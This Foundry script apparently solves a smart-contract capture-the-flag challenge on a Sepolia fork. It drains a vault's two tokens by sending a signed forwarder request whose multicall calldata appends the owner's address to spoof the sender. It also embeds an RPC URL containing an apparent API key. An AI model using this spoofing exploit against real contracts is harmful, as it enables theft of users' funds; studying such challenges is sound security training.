// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Script.sol";
import {MyVault} from "../src/MyVault.sol";
import {Forwarder} from "src/Forwarder.sol";
import {Token} from "../src/Token.sol";

import "openzeppelin/utils/cryptography/SignatureChecker.sol";
import "openzeppelin/utils/cryptography/draft-EIP712.sol";
import "openzeppelin/utils/cryptography/ECDSA.sol";

contract Deploy is Script {
    Forwarder public forwarder;
    Token public a;
    Token public b;
    MyVault public vault;

    function setUp() external {
        vm.createSelectFork("https://eth-sepolia.g.alchemy.com/v2/2L8rIM6Q5Z4tyBCHsPRgC22Fx-JVA4T0");

        forwarder = Forwarder(0x9FfA2f219A0590db1452273012f97344b0f71CEB);
        a = Token(0x2A24Fda81786fbCFCb43aA7DaBa2F34BF6115383);
        b = Token(0xAC97A7333982A170A3512bE4Ccb6A25d06004E63);
        vault = MyVault(0x1A6AbFC7D750Cbe2f7c2cc52329CD22fb7AE5Aae);
    }

    function testHack() public {
        hack();
        assert(vault.confirmHack());
    }

    function hack() internal {
        // Let's see what you can do

        uint private_key = 3454556675;
        address attacker = vm.addr(private_key);
        console.log("Account", attacker);

        vm.startPrank(address(attacker));

        uint256 gasLimit = 100000; // Example gas limit, adjust based on your needs
        uint256 nonce = Forwarder(address(forwarder)).getNonce(attacker);
        uint256 deadline = block.timestamp + 600; // 10 minutes from now

         // Prepare the calldata for withdrawTo calls
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodePacked(
            abi.encodeWithSelector(
                MyVault.withdrawTo.selector,
                address(a), // The address of token a
                address(this), // The address to receive the withdrawal
                vault.myBalanceOf(address(a)) // The amount to withdraw
            ), vault.owner()
        );
        calls[1] = abi.encodePacked(
            abi.encodeWithSelector(
                MyVault.withdrawTo.selector,
                address(b), // The address of token b
                address(this), // The address to receive the withdrawal
                vault.myBalanceOf(address(b)) // The amount to withdraw
            ), vault.owner()
        );

        // Execute the batch call
        bytes memory dataMultiCall = abi.encodeWithSelector(
            vault.multicall.selector,
            calls
        );

        // Example of crafting a malicious ForwardRequest
        Forwarder.ForwardRequest memory req;
        req.from = attacker; // The attacker's address
        req.to = address(vault); // The address of the MyVault contract
        req.value = 0;
        req.gas = gasLimit; // The gas limit for the call
        req.nonce = nonce; // The nonce for the request
        req.deadline = deadline; // The deadline for the request
        req.data = dataMultiCall;

        // Encode the req object into a single bytes array
        // bytes memory encodedReq = abi.encode(
        //     req.from,
        //     req.to,
        //     req.value,
        //     req.gas,
        //     req.nonce,
        //     req.deadline,
        //     req.data
        // );

        bytes32 encodedReq = createDigest(req, address(forwarder));

        // Example of signing the ForwardRequest
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(private_key, encodedReq);

        // Pack v, r, s into a 65-byte signature
        bytes memory signature = abi.encodePacked(r, s, v);

        // Example of executing the ForwardRequest
        forwarder.execute(req, signature);

        vm.stopPrank();
    }

    function createDigest(Forwarder.ForwardRequest memory forward, address _forwarder) internal view returns (bytes32) {
          return ECDSA.toTypedDataHash(
              Forwarder(_forwarder).DOMAIN_SEPARATOR(),
              keccak256(
                  abi.encode(
                      keccak256(
                          "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
                      ),
                      forward.from,
                      forward.to,
                      forward.value,
                      forward.gas,
                      forward.nonce,
                      forward.deadline,
                      keccak256(forward.data)
                  )
              )
          );
      }
}
